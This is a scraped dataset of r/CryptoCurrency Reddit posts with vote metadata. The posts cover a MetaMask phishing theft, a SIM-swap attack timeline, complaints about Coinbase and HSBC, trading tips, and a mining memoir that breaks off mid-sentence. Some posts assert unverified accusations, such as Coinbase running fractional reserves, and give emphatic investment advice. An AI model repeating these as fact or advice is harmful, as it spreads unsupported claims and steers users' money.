If you want to join me in watching metamask account get robbed by some asshole look below,"my metamask wallet number is 0xc97603fc31d6e96c2a145ec44b369d5263470279 some bustard who tricked me into clicking on a dodgy link (pretending to be tech support for snx on discord) has taken half my wallet so far (about $130k). the rest is still there but disappearing slowly in front of my eyes. you can see all the transactions from this morning how he/she is cleaning up. unfortunately there doesn't seem to be anything i can do other than jumping on the occasional eth transfer they are making in so i can sweep it out. the only reason i haven't shared my secret phrase with the whole world is a quiet hope i might one day get it back. but if that's never going to happen maybe i should share it with you all. after all it would amuse me if someone else steals it before @scofield#0471 takes it all..... edit: i can see people asking why am i not moving the coins out. the answer is i really, really, really tried. however there seems to be script which instantly transfer the coins to a different wallet, no matter what i type in for gas fees or the address. so far i failed on alcx, on yfi, on slp, on aave - so i have given up as i don’t know what to do a setting up a script myself is beyond my abilities. whenever i add in eth, all it does is makes its easier to the bastard to take my coins. so all i can literally do is watch right now. second edit i was sent a link to a site which was going to validate my mm extension. the site looked real enough that i clicked on it and entered my security phrase. that was where i suddenly blew up 6 years worth of hodling in one go…. third edit normally i am hyper sensitive to security and very very wary of online support from strangers. however, due to a rare combination of sleep deprivation from staying up late to watch the euro 2020 final, and not paying attention when i should have i made the fatal error of falling for what is now obviously a elaborate con. i’m so used to clicking approve on defi sites to connect to wallets that my guard has as down and this looked genuine enough. by the time i realised what was happening it was too late. i logged into mm from a macbook as my original wallet was on pc, but it made no difference. they initially took 8 eth, some sushi and old gnt i forgot to convert. with no gas fees the raid stopped. so i thought i would be quick and add a little gas and try and take some out. that didn’t work - no matter what i big in gas fees it was either immediately outbid (lost my aave and steth) or accepted and went to another wallet which i didn’t recognise (lost my alcx there). later the fucker started liquidating my assets and put gas in to do this. i managed - and this was through the most frantic clicking and accepting any fucking gas bid at the highest price to transfer out the eth to a separate wallet. i managed to get some out which slowed the attacks as there was no eth to pay for the gas. this would happen every hour and i managed to get about 0.05 eth lol this was totally my mistake and not due to snx, who to be fair, warn you not to do what i did. but i was tired, had sent a message to their tech support sub and instead of reading the warning, ignored it like a noob so yeah - i own this and it’s my fault. to those of you who think this is fake, i hope it never happens to you. i had to take a day off work to watch this slow motion disaster - i am sitting with a sick feeling, with pounding chest and periodically start tearing up which i can only assume is a slow motion panic attack. i have told my wife who is understandably shocked. when it all goes, i get to tell the rest of family that i got fucked over through one single lapse of judgement. i posted this as a warning to the bulk of the community who could just as easily have fallen for the same i used to look down on exchanges but they all look safer as least they have 2fa which mm lacks. i’m pretty much done now with believing crypto will only change the world for the better and for the first time have been thinking, bring on more fucking regulation and make every wallet linked to an id - that way one day i can find out the bastard who cleaned me out and will spend what i have left on justice. fourth edit thank you so much to everyone for their sympathy and support. to those of you telling me i’m dumb /stupid / foolish for so much holding on mm, thank for the comments but after the first 100 i stopped reading them as they get dull quickly. it was a mistake to leave so much on mm and with hindsight, the fact that my ledger wasn’t letting me connect to some defi sites was an obvious flag rather than an obstacle. so since this afternoon, i was recommend the flashbots service on discord by some of you. with some (read massive) trepidation about using discord again, i posted my details and one of their whitehat guys alex got in touch. i won’t give all the details for now as he’s still on the case but he already rescued just over 40 steth that was staked on curve as a eth/steth lp pool. i’m overjoyed as that’s $85k that i had written off now back (and in a ledger before any of you ask). i’m hopeful as to what happens to the remaining $35k but it already feels like a fuck you to the thief. thanks to those of you who told me some of my stolen money may have gone to kraken, i’m messaging them so i hope they can freeze the money and if i’m lucky even help id the counterpart (not holding my breath though as i don’t know ifs it’s real and whether they will help or not). with respect to the site i clicked on, dm if you really want to know but i left it off here in case someone else clicks on it and makes the same mistake i did. i’ve got in touch with the domain hosts to ask for their help in identifying the thief. obviously it not the best day in the world but feels a hell of a lot better than it did a few hours ago. fifth and hopefully final edit thank you to everyone who has sent positive messages of support, both below and in the chat. they have really helped, especially at the start when i was super stressed with indescribable feeling of watching my account get emptied in front of my eyes and being powerless to do anything about it. the (useful) advice from people was helpful and i am especially thankful that the flashbots teams was recommended. alex has been been awesome. after he verified that the account was actually mine he stepped to stop the bleed (and i appreciated the fact that both the groups on discord and even this sub want to fact-check this to make sure it’s not a scam or a lie to flame someone). he set up a burner to remove incoming eth which meant the thief couldn’t take more as there was no gas on the account. he then started to work on moving out the remaining coins to a safe wallet. at the time of writing he’s retrieved 117k from the 120k that was left (using this mornings prices). there’s a bit left which will hopefully come over but given how much was taken this am, that’s a rounding error on what i lost. for those of you who need his details dm or wait as i’ll edit one last time and add his twitter account when this is all over and i’m calm. he has been amazing and whilst they ask for a modest fee it’s well worth it. thanks to kraken for reaching out and apologies to snx if it looked like i was blaming them for my mistake. hopefully kraken can help but i’m also going to message a lot of the other exchanges too - anything i can do to make the money hard to get for the thief will make me happy and maybe it might even get him caught (but really not holding my breath on that). for those of you who keep wondering (1) no, i am not doing this for moon farming as making a few dollars and getting karma in no way makes up for a hit, (2) this isn’t a new account. i’ve been on reddit for years but am usually silent as the chats can get poisonous quickly, (3) even i knew it was risky leaving so much on a hot wallet but i have used mm for a long time and found ledger to be challenging with some defi. i really wish i had been more careful but that’s done. i don’t blame anyone other than myself and the bastard who stole my coins but wish mm had 2fa which would have killed this or a way to hard freeze your account instantly which again would stop the bleed and work out a recovery and (4) for all of you who are sitting on your high horse lecturing me on how dumb this is and why you should never use your private data online - i fully understand and agree with your point of view, as yesterday i would have been like you safe in the knowledge that nothing like this would ever happen to me….. it’s been a hell of day but i’ll be fine with time. sixth and final edit okay so it been a surreal 24 hours. for those of you who want the full sequence of events it’s basically this. i have a few different accounts but started using metamask heavily in recent months. basically because argent was heavy in gas prices and my ledger didn’t always connect to some of the defi sites i stitched to mm. thanks to a run up in crypto market valuations, and some small trades and staking, the $20k was playing with 6 months ago in the hot wallet had became around $250-260k yesterday. my first mistake was leaving such a large amount on mm. in fact i had been actively considering moving some of it but with hindsight waited too too long. at times gas prices on eth have been insane and was my pure bad luck that yesterday was one of the cheapest days around where tx were a few dollars rather than $20-70 which i’d seen in previous weeks. trying to save a few hundred bucks turned out to be a very bad decision. with hindsight, i wish i had got up and gone to work and the worst that would have happened would have been feeling deeply disappointed by the england performance the night before. instead i went on to make one of the most expensive mistake of my life. i decided that yesterday i would finally get around to messaging the help desk at the discord chat for snx and ask if they could help me with some snx i had deposited there on the l2 wallet. the problem was, that i was able to see the amount of snx on their optimism mainnet which showed snx token only but not but not my eth, whilst the ethereum mainnet showed my eth and other alts but not the snx tokens. i went to the sub and asked for help in the chat. got no response and tried a bit later. that time i got 3 people replying in private chats each claiming to be from snx. whilst the snx sub warns against this, i was tired and assumed that maybe it was like some of the other subs where people can advise you if the mods are busy. to my misfortune i replied to the scammer explaining the problem. he basically told me my mm wallet wasn’t syncing back to the network and i should validate it. that sounded plausible given i couldn’t see my total balances and also in recent weeks i’ve faced a glitch as time where the wallet balance comes up a zero for up to a minute when i first open it so thought maybe he’s right. to help, he sent a link to quite a detailed looking site which looked real enough and unfortunately, thanks to weeks of linking random defi sites to my mm wallet i had become unfortunately desensitised to connecting to random pages and accepting connections to my wallet when i tried the link on the fake site, it wasn’t working apparently so scammer suggested i try again. this time, i figured maybe i should try the option to connect to my wallet by entering my private pass phrase. yes i know it was dumb now yes i realise it’s my fault. i’ll live with this expensive mistake for a long time. a strange set of events in which i was super tired, not nearly alert enough and my warning radar was off meant i went for the most basic and simple phishing scam. to those of you on your high horses laughing about how this can never happen to you - good luck and i hope you carry on living perfect lives in which you never make a mistake. a few mins pass as the scammer is still engaged on the discord chat explaining it will take some time. he then causally asks me if i have a ledger and want to sync that too…. at that instant, i suddenly realise what i’ve done and get a cold sweat. why the fuck should he ask that unless…. i check my mm wallet on zapper.fi and see that the wallet balance has suddenly dropped. i’m now missing $20k and a quick check shows my 8 eth, some sushi and some golem which i had are gone. i start to get super angry that i’ve lost 8 coins. after a few mins i calm down and suddenly realise that the only reason i haven’t lost more is there is now zero eth on my account so no way to do more transactions. it’s likely that he must have set up a copy of my wallet on his pc and started emptying it out. at this stage i’m becoming less angry about what’s gone and becoming deeply worried about the rest. i send frantic emails to mm which aren’t answered until late in the evening and the next morning (which basically tell me there is nothing that can be done in my case and be more careful next time - thanks guys, will never be using you again.) at this point, the major weakness of mm finally hits me. forget the convenience, if all goes wrong i have literally no way to stop any transactions (hell they don’t even show in my wallet but i can see them on zapper) or freeze the account. consensys may have built a nice chrome extension but it’s useless if there’s a problem. at some point i look up and see that more of my coins are disappearing. 20 odd steth suddenly disappearing is especially painful. i check on zapper and can see he is putting in eth to put up gas fees to move stuff off the defi sites and liquidating my coins and moving them out. now i’m actively watching the account on zapper. whenever i saw eth come in i tried to first move the coins to my ledger but every single time it just goes to another unknown wallet. wtf? i eventually understand that they have copied my account on a different pc and are probably running a script to automatically outbid me. i had watched my one yfi go - that hurt as i had spent a btc on it lol. i watched my 104 alcx go - another 15 eth gone in smoke. my whole accounts looks fucked and all i can literally do is watch…. around this point i send my first panicked message to reddit that i was down 130k and likely to lose the whole lot. i figure maybe between the likely ridicule and crap i will get, maybe i will get lucky with some help. in the meantime all i can do is try to run slight interference by trying to move some of the eth that the thief was adding to another account. strangely moving eth to another wallet appears to be the only coin i could impact. when i can moved it i try and run a tx and cancel it with a high gas fee to disrupt the eth balance and screw up his transfers. this slows the bleeding but it’s not over and i don’t know what i can do. i read messaged here about trying other pcs, logging out of mm, i try it all and it does no good and makes me more stressed that the scammer might be stealing more when i’m not watching. when i first posted on reddit i was down about half with the remaining amount staked on curve (alcx/eth lp, zrx/eth lp, eth/steth lps) which was around 120k. don’t know why they were last to go but thank god they were there. in between the usual trolls and assholes calling me a liar, there were messages of support and some very helpful suggestions on then flashbots discord sub (initially sent to me by the snx subs). i messaged flashbots and alex from there got in touch. i gave him full info and access to my ex to verify it was mine). even he commented that i shouldn’t do this (lost track of how many times i heard that yesterday) but as my account was already compromised i had to trust it would be okay as without it he couldn’t do anything. he explained that he would first set up a burner so any eth coming in would be immediately burned leaving no gas for transfers. this was quickly set up which closed the gate on the thief for the short term. for those of you checking the wallet history you can see some incoming eth which then immediately is removed - that scammer’s eth he’s wasting now. i didn’t want to alert him as to what was happening, so there was minimal mentions of this on my posts to reddit, which i was still checking as this forum sometimes has some very useful feedback and suggestions. over the next 8 hours alex managed to move the remaining balance to a hard wallet and basically recovered all of my remaining balance minus some dust and dai staked on alchemix which i can’t get back so it’s all there which was around 117k out of 120k. i don’t know how he did it - if you really want to know go to discord and ask him - but i am overjoyed that he did what he did. it’s amazing for both his stepping in and spending hours to save this and no less for his 100% total honesty and integrity. if he had moved the coins elsewhere and told me it was the original thief i would never have known. in the end i’ve lost about 55 eth and saved about the same (values were all over the place as the market tanked in the evening). i didn’t post for moons or karma. i posted as a warning and for help and i’m glad i did. i would never have found the courage to trust flashbots without it. i would not have been alerted to the scammer using kraken to deposit the stolen coins. to those of you who offered financial support/crypto/gofundme, thank you so much but there is really no need. alex has saved a big chunk and i will be alright. losing this amount of coins thanks to a scam is painful but if i couldn’t stomach large swings i wouldn’t have held on for years - if i can live through a few 80% drawdowns in btc and eth and recover, then i’ll come back from this okay (however for a while i will stop measuring my crypto value in $ rather than #coins lol). thank you very much to everyone who offered emotional support and well wishes. they are very much appreciated and more than make up for the large number of trolls and morons who like to throw around shit. please don’t worry about me. my wife, whilst initially shocked and upset, is fully supportive and i have every confidence i will do really well (especially after eip 1559 and later eth 2.0) to the libertarians, outraged that i’ve swung to side of more regulation, i want to say that i still believe that you should do what you want - legally. it doesn’t have to be totally anonymous - hell half the problem with the current version of the internet is anonymous trolls venting lies and crap everywhere. for crypto to go truly mainstream you need some degree of safety and the ability to follow up and prosecute crimes. watching some c*** screw me over in real time was an infuriating and humbling experience and definitely made me resent the anonymity of the scammer….. btw for those of you who go on about being your own bank good luck and come back to the real world where actual banks are regulated and safe (unlike the current wild west of crypto defi) and remember many of us don’t want to be our own bank. i never thought about being my own bank and bought coins like eth for other reasons. i like the blockchain and the crypto space as they are exciting and disruptive ideas that will hopefully make a new version of the internet in due course and change the world. however like the internet 2.0, no matter how it starts, eventually governments will step in and more regulation is coming. mr scammer, i’ve already reported you to a bunch of exchanges where you seem to be staking your stolen coins and even if i can’t get you immediately, your records are permanently there on the blockchain and one day you will be fucking found…. finally thanks again to alex! for those of you who asked about him, his twitter handle is @amanusk_ check him out, he’s a true legend and a gent.",10911,2739,0.85,2021-07-12 07:12:31,web3,CryptoCurrency,007happyguy,False,7650.7

Last night I was the victim of a SIM swap.,"it all happened very quickly. at about 11:58pm i received a text that a new phone service had been activated on my number with a carrier i don't use. it came with a link to a password protected (pin setup when the service was purchased) pdf file that contained the contract for the start of service. i had a friend of mine crack the password to the pdf which ended up being 13371337 (lol). they filled out the form with bogus info for the name and address. [password protected start of service form.](https://preview.redd.it/geqpvl86wp171.png?width=1621&format=png&auto=webp&s=fcdea3cf9b228c6c2af0534b6a402ccc92d2b799) at this point my phone number had already been stolen and my phone lost service, being unable to text or make phone calls. &#x200b; i tried logging into my email account, and the password had been changed. since my mobile number was linked to my email account, the attacker was able to now use my number to get the code to reset the password. i thought i had removed the phone number from this account but apparently i missed it. at some point last year i anticipated this happening and switched most of my 2fa to google authenticator instead of sms, which ended up saving my ass last night. &#x200b; at around 1:44 am i was thankfully able to regain access to my email account by using my backup email address on file which the attacker thankfully hadn't changed, and also provided some other info to my email provider to prove ownership. at first nothing seemed out of place until i checked my deleted messages folder and saw password reset requests for three different cryptocurrency exchanges i have held accounts on. two of these don't hold many funds but the third currently holds a fair amount of my coins. (this is another reason you should keep your coins off of the exchange). time frame was as follows: **11:58 pm:** i get a text about service being activated for my phone number, i lose phone service. **12:08 am:** my email password is reset. i don't notice this for over an hour. **12:09 am:** coinbase password reset request. **12:13 am:** kucoin verification code sent to my email. **12:14 am:** kraken username request sent to email. **12:15 am:** kraken password reset request sent to email. &#x200b; as you can see ***the entire attack lasted less than 20 minutes***, which is terrifying. &#x200b; thankfully i had google authenticator 2fa setup on all of these accounts so the hackers were not able to gain access and drain my funds. anyone using sms verification should switch to google authenticator because this is the one thing that kept my coins safe. i still need to recover my phone number and at this point i feel like i should change my number or carrier. my mobile carrier only requires a 4 digit pincode to login and make changes which is probably one of the weakpoints that allowed this attack to happen. my information was leaked in the ledger breach that happened last year and i am positive that this leak is what caused me to be attacked last night. i am sure i am on a list being passed around and some of you might be as well. please exercise caution, secure your passwords and enable google authentication and 2fa on everything you can. edit: so i spent all day at the carrier stores to get this figured out. since my number was ported over, then cancelled, i was unable to port it back to my original carrier to finish out my month of service. i went to metro by t-mobile and was able to get my number back but i had to buy a new phone since my current device is not unlocked. all in all i ended up having to spend about $200 to get my number back.",11598,1636,0.95,2021-05-27 15:49:52,web3,CryptoCurrency,Vmn551,False,7622.700000000001

Coinbase has become the new Robinhood. They're artificially withholding Algorand withdrawals because of liquidity issues and do not want to lose out on their governance rewards. It has been over 24 hours now and they're pretending it's a technical issue.,"my guess is coinbase is running on fractional reserves and doesn't wanna lose out on it's governance rewards so they are artificially delaying withdrawals of algo. i don't know about you guys but after i get my algo's withdrawn i'm finding an alternative to coinbase. they have officially lost my business which is a shame because i've used them since getting into crypto. they did this exact same thing before the 1st governance period in september and people lost out on signing up. this is no different than what robinhood did with gme stock. it just shows that cex's need regulation desperately and we're currently at the mercy of coinbase assholes. there have also been other strange things between coinbase and algorand. for the longest time they had algorand listed as an erc-20 token. additionally they commonly do not post updated/correct news for algorand. a few days ago they listed securitizes tokenization of down jones index funds as happening on ethereum instead of algorand, since then they've taken it down from ethereum but haven't posted it to algorand news. this all smells a bit fishy. i have been having this feeling for a while that coinbase is deliberately trying to undermine algorand. does anyone know of a good alternative to coinbase and binance in the us? &#x200b; edit 1: they canceled my withdrawal after over 24 hours pending and said ""blockchain transaction was compensated"". i'm wondering if i should try to withdraw again or convert to another coin and transfer off. edit 2: tried withdrawing again and it canceled almost immediately and said the same thing ""blockchain transaction was compensated."" i'm pretty sure they still took my .002 algo transaction fee though. cb is fucking us over royally. edit 3: tried withdrawing once more, instant withdrawal cancel with same reason as before. i'm done trying to withdraw tonight. will try again tomorrow in the am and update the post. edit 4: i was finally able to withdraw my algo's today. look's like coinbase most likely saw this post and bought more algo. the amount of algo in coinbase 2 doubled and magically withdrawals were reenabled. which means this was 100% a liquidity issue, and not a technical issue. thank you everyone for contributing, i'm proud to be a part of this community. the elites get scared when all us little guys work together, never forget how powerful we are when we work collectively. this is the exact reason why we are all here, so huge monolithic entities can't dictate and control our lives without any recourse. edit 5: make coinbase squirm. withdraw everything. coinbase 1 is down to 351 algo and coinbase 2 is down to <1 million algo. let's clean them out. hopefully they will learn not to do this again. edit 6: i've been reading some people are still having problems withdrawing.",11209,1981,0.91,2021-12-17 18:06:05,web3,CryptoCurrency,gigabyteIO,False,7526.9

On may 24th CEO of one of the largest bank in the world - HSBC publicly said that crypto lacks transparency and later it's UK branch started to block payments to Binance. Yesterday same British HSBC branch has been fined £63.9m by the UK's financial regulator for money laundering!,"this is the clear example of hypocrisy at its finest! seven month before their ceo noel quinn publicly announced that hsbc will not be offering any services related to bitcoin and crypto entirely to its users and linked his decision to the ""lack of transparency"" and high volatility in the cryptocurrency industry. as per quinn, it is impossible for an agency to tell who owns the crypto, and hence everything depends on whether the holders can be ""trusted in regard to market integrity."" and yesterday karma hit them back, the same fucking swindlers are fined £64m for anti-money laundering failings. actually, initially they were fined for £91m though since hsbc not disputed the findings and agreed to settle it was cut down to £63.9m. hsbc's failings cover a period of eight years, from 2010 to 2018, the fca said. [**the fca's report into hsbc**](https://www.fca.org.uk/publication/decision-notices/hsbc-bank-plc.pdf) cites examples of poor controls, including failing to spot suspicious activity on the account of a construction director who also played a leading role in a criminal gang trying to steal millions of pounds by setting up fake companies. the person pleaded guilty to vat fraud and went to prison. hsbc also failed to detect a customer imprisoned for smuggling cigarettes into the uk and ordered to pay £1.2m by the hmrc tax office, where the bank missed ""a sustained period of unusual activity,"" the fca said. for those who did not know, in 2012 after an investigation by the us department of justice the same bank paid $1.9bn fine (£1.4bn) for laundering money of mexican drug cartels, circumventing the rules designed to prevent dealings with iran, burma, north korea and being financed by terrorists from middle east. so dump fucking hsbc shares if you have any and buy crypto and if you wonder, yeah this is financial advice.",10687,2559,0.94,2021-12-18 05:51:05,web3,CryptoCurrency,Techvarius,False,7445.2

I'm been in crypto since 2013. Maybe 700+ alt coins and many trades. Now a Defi-Crypto Farmer. Here are some of my tips and advice for new-comers.,"as the title says i'm into crypto pretty deep. i was in crypto briefly in 2013, but only really hit the ground running in 2017 and never looked back. in 2017 i made all the usual mistakes, got into the wrong coins, entered some dodgy exchanges and sold the wrong coins (like selling enjin on its first day after investing in the ico). in 2018 things got worse, with shitcoins driving the btc value of my holdings down by half. now i'm sitting really pretty and feel like i have ""clicked"" to the point where i am generally making money in crypto and quite a few people ask me for advice on what to do, strategies etc. here are some of my tips, observations and ideas. 1. don't trust anyone. assume everybody you are talking to is a friendly thief who wants your money. that includes people shilling particular coins, or anyone asking for your crypto to invest, to random people that message you. (and yes ironically this means don't trust me, but you'll see i didn't mention my altcoin holdings and i am deliberately staying quiet on what my 800% defi pool is :) ) 2. every position you enter should be a fixed percentage of your portfolio. i prefer 1% for a typical trade. risky uniswap gems might be 0.5%, very strong longer term positions say 2-5%. 3. have your portfolio value in btc (or eth if you prefer that). your goal is to increase your btc value. each trade should be from btc, and then exit back out of btc. log all transactions in blockfolio etc under the btc pair, so you can see how much btc value you are gaining. don't worry as much about usd gains, as in a bull market its easy to make usd value gains. btc is the end-game here so you want to accumulate btc, especially if btc dominance is falling. 4. have a portion of your portfolio allocated to farming or staking. if you have a coin sitting somewhere for ages, ask if there is some way for you to make money from it. for example, i have a large stack of btc and eth, so rather than have it sitting doing nothing, i wrapped the btc and entered a sushi farm. months later the rewards from that farm are worth something like 25% of the amount i initially invested. every so often, harvest the rewards and either re-farm (compounding) or shift to your long term hold. remember compound interest. there are opportunities for very high returns (without ponzi aspects but be careful) - find those, constantly take and re-invest the income and the gains are quite extreme. 5. have a dedicated stack of btc or eth that is your ""hodl"" portfolio that you never touch. preferably in seperate legal entity (like a trust) than what you trade with. this will help for taxes. every so often, move some profits into that long term stack. i don't do anything with that stack at all, it is just my safe holdings. 6. spend as much time learning about tax as you do trading. tax is something you kind of need to understand upfront - you can get way more rekt from bad tax approaches than you make gains with good trading. and keep your records safe - download all trade histories at the end of every quarter. 7. use telegram (or discord). find really helpful smart and useful people and stick to them. find helpful trading groups. eventually they will be a vital source of information or just ways to bounce ideas off. check out my previous post for a full guide on ""must have"" telegram groups. 8. read the crypto news as much as you can. its amazing how often something pops up (e.g. grayscale announcing new trusts with other coins) and there is still a decent amount of time to buy. and always have some btc on an exchange ready to buy on such an opportunity. again, telegram is great for this as you can quickly see tweets or news-links being shared. 9. have a preset % of gain or losses whereby you will sell if it reaches that. for example, for most coins, if a coin ever goes up more than 30% vs btc in a day i always sell. 95% of the time that works out as better than holding. in the rare event i double my position i always sell the principal immediately (i did this twice this year - with ethernity and blind boxes). 10. always have an idea as to what the current ""climate"" is in terms of what is moving and in favour. crypto markets often move with certain sectors at a time. for example, if you look at the coin gecko categories list, you can immediately spot what is ""hot"" right now. last month it was nfts, so i was heavy in that space, but now that sector is cooling. the binance smart chain and exchange coins are doing very well right now - if that is the case what else might move? well other low gas blockchains could be an idea - especially if they have defi - so avax, raydium etc are all moving too. soon it might well be btc's time to gain as the expense of alts. you should be rotating in and out of positions to try and go with the ebb and flow of the market. 11. for newcomers, start with basic stuff like accumulating bitcoin, learning to use a wallet, security etc. don't just dive in and ape into defi coins, wsb style. it may suck that it feels like you are missing all the gains from the ""hot"" new coins, but it will equally hurt if you are just burning through your capital. 12. look out for free crypto opportunities. they key here is sorting out the gems from the scams. this isn't just staking etc but also things like reddit moons and airdrops. a lot of people are even ""airdrop farming"" whereby you have wallets that carry out certain activities deliberately to try and qualify for future airdrops. coin market cap earn and coinbase earn are two more. even something like the binance ""dust"" feature to turn dust into bnb is a way of generating some more bnb (even if its tiny). check out my previous post on free crypto and ways to get passive income 13. for farming, make sure you are using the right apps like zapper or apy vision to track all your positions, your yield and any impermanent loss. that will also help with tax records down the track, should you need it. watch out for farming on the eth network as your gas fees will chew up any gains if you have small positions. check out my previous post of sushi farming for how the rewards and gains work 14. track all your numbers, your gains, your investments and portfolio change religiously, preferably in an excel document. that way you'll know how you are performing and if something is going wrong. again, i wish i had done this more in 2018. 15. have an ""emergency reserve"". for me, this is actually my stock positions, many which are crypto related, but you could have gold or cash (i especially like the idea of something like stable coins lent on ftx at a decent interest rate). if we get some kind of crypto turbo dump which is 40%, you can then have that as money on the side-lines ready to buy. 16. constantly educate yourself. for me, i still need 3-4 hours a day to research and learn about crypto. i find crypto podcasts and even youtube vital sources of information, provided you are listening to the right people. mix up your education with news, technical strategies, trading updates, altcoin news and even just the general philosophy behind sound money and financial sovereignty. 17. if you win or lose on a trade, delete that coin from blockfolio immediately. why? because you have exited that position, and seeing it jump up again in price is just going to torment you. you've made the decision to sell, don't even up revenge trading where you come back and try and get your losses back on the same trade. 18. never margin trade unless it is only because you want to minimise your funds at risk on an exchange. even then i'd avoid it. unfortunately many exchanges make this very hard to use - and there are confusing terms and default options which can rekt you (for example, positions that will drain your other funds instead of liquidiating the trade if falls too much). in fact, i avoid almost all usd pairings and only trade btc pairing, unless very special circumstances are in play (such as ripple being delisted from coinbase). 19. never hold more than around 10 coins. i used to have up to 40 at a time, it became impossible tracking them in terms of activity, prices, and god the horrors of trying to maintain enough wallets for them. 10 is enough diversification. i used to have a ""bag"" of around 15 moonshots - that strategy never worked as even if one ""gem"" actually made it big, the losses from the other ones cancelled out. typically if i had a huge gain from one of my coins, i sell back to btc and waits for other opportunities. this isn't pokemon - don't try and ""catch them all"". 20. falling in love with alt-coins is like falling in love at a stripclub. yes trade them. but just be conscious that their chances of beating btc long term are very unlikely. just look at all my 2013 gems (peer coin, feather coin etc). heck i bought world-coin because i read about a ""bitcoin genius teenager"" who made millions from crypto and said world-coin was the next bitcoin. and i've made my mistakes as well going forward, holding on for dear life for nano (yes i know its fast and instant!) and grin. i think the tech for both coins is great, that doesn't mean its a great trade. if you want to marry your alt-coins then you will be lucky if you only lose half your money like a real world divorce :) 21. edit. bonus one. always learn from your losses (and i have many). i like to think of crypto as like a computer game where you are gaining new skills. think of rpg games like baldur's gate or warcraft. you can earn money or experience, and use that to gain new items or skills that protect you against certain things. so maybe you lost $500 to a ""rug-pull""? well do your research and figure out how to avoid that next time. maybe you'll spend the next 2 weeks mad about it, but next time a potential rug-pull project comes along you'll dodge it - congratulations you now have learned ""immunity to rug-pulls"". keep learning and gaining more experience and you'll start avoiding all the traps. 22. edit 2: you are going to have many scenarios where you see a coin that has gone x1000 or to some ridiculous crescendo, where you feel utterly compelled to buy to avoid missing out. this is the obvious trap (if you want an example of this look at safemoon right now. bitconnect was the one in 2017 and there are others). at some point bitcoin or ethereum will do a similar run up, and many people outside crypto will do the same thing. yes this can be irresistible but you must resist the temptation - think of the cryptos has being a bunch of boats on the wharf, and there are thousands of boats. every day another hundred turn up. why are you going to try and jump across the water to get to the boat that is already leaving, when if you wait a bit another few dozen will turn up in five minutes? you'll just fall in the water and miss out on those new boats! 23. if you must trade as a new-comer, i highly suggest trading the smaller / middle cap btc pairs. not the usd or margin pairs. certainly not something like futures contracts on ftx. why? because if you are on bitmex / bybit / ftx etc you are swimming with the whales and sharks, quant funds, robo-traders and the like. if you entered the casino for the first time in your life, would you immediately go to the blackjack table with james bond and dr evil? the smaller btc pairs are more likely to have less experienced traders - my trades actually went positive once i moved from usd pairs on margin exchanges to spot btc trades with altcoins. 24. last edit before bed (i promise). the chances are, crypto is still cyclical. that means we will have another bear market, or at least a very long boring period of no gains. if you have just joined crypto, you probably won't ""make it"" this cycle, as we may only have 6 months to a year to go. i actually lost money (a lot) in both the 2013 and 2017 bull markets (-50% and -85%, respectively). all of my gains were made in the bear market when i was buying btc and alts when btc was in the 3ks. the ""will you make it?"" test isn't coming now when the market seems to be going infinitely up and everybody is winning. that test comes when everybody is selling and it seems like you are the only buyer. and yeah, thousands of alt coins will suffer or die at that point. so be around to scoop up the ashes - don't be the ashes! this is all a larger part of learning to move with the cycles. anyway these are the ones that come to mind, hopefully that is helpful! no doubt i'll edit this post and add a few more.",10415,1309,0.9,2021-04-10 22:37:48,web3,CryptoCurrency,Cryptodragonnz,False,6781.6

20% dip? 🤷‍♂️ Looks pretty normal to me.,"it's april 2011, i am mining on some number of radeon 5850s making around 1.1 btc each day. the price is crossing $2. it's may 2011, i am mining on some number of radeon 5850s, doubled. mining difficulty is climbing quickly, and so is the price. we're almost at $10 by the end of the month and i'm still making around 1 btc per day, somehow managing to stay on par with the difficulty as i buy more graphics cards. it's early june, and as i am powering on even more gpus, the price hits roughly $32 before halving over that weekend. november 2011, we reach $2 after several months of everyone declaring it dead. i am on something like 8 5850s now, probably still making around 1btc, maybe a bit less, it's difficult to remember after 10 years. after the monstrous crash of about $30, things begin to pick up by the end of the year and we enter 2012 at about $5. we crash from $7 to $4 between january and february, then from $13 to $8 over one weekend in august. it's dead, each time. it's 2013 and things are batshit insane. we have some minor 10% drops through the year but everyone is buying. everyone is mining. i heat my new rental property with radeon 7990s and only heat the house with graphics cards during the entire winter from 2012-2013. about 11 steps up the stairs, you go from freezing cold to being blasted with heat, like when you exit the plane into spain. by april we all lose our shit and people are buying bitcoin for $100. by the 9th they are paying $200 and within a week decide that $70 is more reasonable - a 66% drop in a week. of course, people can't make up their minds whether bitcoin is a scam or if it's the future of humanity, so the price goes haywire and we see regular gains and drops of 10/20/30%. it's november 2013. bitcoin is not a scam. clearly, because it's now worth $200. or is it worth $650? no, it's worth $550. now it's $700. nope, $1,100. now it's $950. now it's december and it's $1,100 again. but what the hell is going on, mtgox won't let me log in despite me not sleeping and spending the last 15 hours through the night trying. now i'm late for work and i've lost 20% of my money, even though i've actually gained 1000% this year, i'm only bothered about losing 20% of what i had a day ago, just like literally everyone else. it's 2014. it's also most of 2015. the entirety of both years. bitcoin is dead. never coming back. we're down to $200. mining still makes me the same $2-3/day that it ever has, even though the 1btc/day from 2011 is now worth $200+/day. i give up. everyone else gives up after buying these new things called shitcoins. i forget, not bothering to sell what i had left as it's barely enough to buy a small used car. it's 2016 and apparently bitcoin has tripled since i last looked at it. what. you what. what. everyone now wants ethereums. it's like bitcoin, but it'll fit on my hard drive. everyone's shitcoins have disappeared. the however many thousands of doggo coins i mined before i quit have disappeared along with the exchange. ethereums are bringing out these new shitcoins that actually do something, like golem, which is like seti@home but will eventually literally do everything and generate an income for you. great! ethereum shitcoins are not called shitcoins. the world of cryptocurrency is very different to how i remember it. i swap half my btc for eth and then 80% of that for various tokens. it's 2017. nothing bad is happening. everyone is investing in icos for non-shitcoins. everyone's making $2k/day just trading. everyone's also making $500-2k/day just holding. everyone has bitcoin and ether, as well as a tonne of erc-20 tokens. some people also have bitconnect which seems very much like the hyips i used to join during my ptc/pts days as a teenager. seems like a scam, no good. ethereum has several 20-30% drops throughout the year. seems normal, i'm no longer phased after 2013. everyone in my office is interested. they all discuss it at $10, but ask me about investing $15k when the price hits $300. finally, they enter at $600 and no one does any work for the rest of the year. we just talk crypto. it's the second half of 2017. i make more on crypto in one day than at my day job in a month. literally everything is going up. no one considers that it'll ever drop again. i'm like: ""🤷‍♂️ looks pretty normal to me, but i better sell some soon else..""... actually, it's january to april 2018. new york bonuses or chinese new year or some seemingly random event makes everyone sell literally everything. everyone had put all their bitcoin into ether, and then all their ether into icos. what was once 25btc was now 400,000,000 various erc-20 tokens, or kittens, worth around $200. not only did everyone sell their tokens, causing them to crash, but everyone sold everything else, making everything else crash. crashception. every second word on reddit is ""crash"". ether went from $1,200 to $75 in a year or so. declared dead by everyone. it's 2018-2020. i'm like, well, not sure. probably will repeat the cycle of 